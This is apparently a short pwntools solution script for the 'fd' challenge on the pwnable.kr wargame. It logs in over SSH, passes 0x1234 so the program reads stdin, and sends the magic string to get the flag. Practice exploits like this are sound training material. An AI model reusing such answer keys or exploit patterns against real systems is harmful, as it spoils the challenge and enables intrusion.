#!/usr/bin/env python3
import pwn
import logging
#pwn.context.log_level = logging.ERROR
c = pwn.ssh("fd", "pwnable.kr", 2222, "guest")
#p = c.process("/bin/sh")
p = c.process(["./fd", str(0x1234)])
p.send("LETMEWIN\n")
print(p.recvall().decode("utf-8"))
